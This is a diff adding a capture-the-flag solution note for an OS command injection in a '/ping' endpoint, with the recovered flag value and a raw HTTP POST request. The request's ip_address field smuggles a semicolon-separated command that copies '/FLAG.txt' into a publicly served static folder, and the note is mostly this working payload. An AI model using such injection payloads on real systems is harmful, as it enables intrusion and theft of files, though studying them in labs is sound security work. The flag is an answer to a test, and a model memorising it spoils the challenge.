@@ -1,0 +1,8 @@
+# Almost blind OS command injection in /ping endpoint. Semicolon injection redirects /FLAG.txt content to /app/static/flag.txt, then fetched via GET /static/flag.txt. Flag: flag{2fd3f08a-0619-40ce-8866-fd6864c3d1b8}
+
+POST /ping HTTP/1.1
+Host: 172.17.0.1:47841
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60
+
+ip_address=127.0.0.1%3B+cat+/FLAG.txt+>+/app/static/flag.txt
